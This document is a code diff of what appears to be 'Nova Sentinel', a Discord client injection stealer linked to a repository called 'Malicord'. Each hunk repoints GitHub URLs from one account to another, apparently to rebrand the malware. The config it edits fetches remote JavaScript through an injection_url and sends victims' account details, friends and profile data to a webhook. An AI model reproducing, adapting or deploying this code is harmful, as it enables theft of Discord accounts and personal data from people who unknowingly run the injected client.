@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/familigy/sub/main/index.js",
+    "https://raw.githubusercontent.com/KSCH58/sub/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -79,7 +79,7 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
     username: "Nova Sentinel",
     avatar_url:
-      "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png",
+      "https://raw.githubusercontent.com/KSCH58/sub/main/assets/lilnova.png",
     content: "",
     embeds: [
       {
@@ -584,10 +584,10 @@ const FirstTime = async () => {
       var Friends = parseFriends(friends);
       if (!user.avatar)
         var userAvatar =
-          "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png";
+          "https://raw.githubusercontent.com/KSCH58/sub/main/assets/lilnova.png";
       if (!user.banner)
         var userBanner =
-          "https://raw.githubusercontent.com/familigy/sub/main/assets/giphy.gif";
+          "https://raw.githubusercontent.com/KSCH58/sub/main/assets/giphy.gif";
 
       userBanner =
         userBanner ??
@@ -640,7 +640,7 @@ const FirstTime = async () => {
           },
           {
             name: "@Copyright",
-            value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://github.com/familigy/Malicord)`,
+            value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://github.com/KSCH58/Malicord)`,
             inline: !0,
           },
           {
@@ -722,10 +722,10 @@ const FirstTime = async () => {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png";
+            "https://raw.githubusercontent.com/KSCH58/sub/main/assets/lilnova.png";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/familigy/sub/main/assets/giphy.gif";
+            "https://raw.githubusercontent.com/KSCH58/sub/main/assets/giphy.gif";
 
         userBanner =
           userBanner ??
@@ -944,10 +944,10 @@ async function BoukiTuclcavectesfonctions() {
   );
   if (!user.avatar)
     var userAvatar =
-      "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png";
+      "https://raw.githubusercontent.com/KSCH58/sub/main/assets/lilnova.png";
   if (!user.banner)
     var userBanner =
-      "https://raw.githubusercontent.com/familigy/sub/main/assets/giphy.gif";
+      "https://raw.githubusercontent.com/KSCH58/sub/main/assets/giphy.gif";
 
   var userBanner =
     userBanner ??
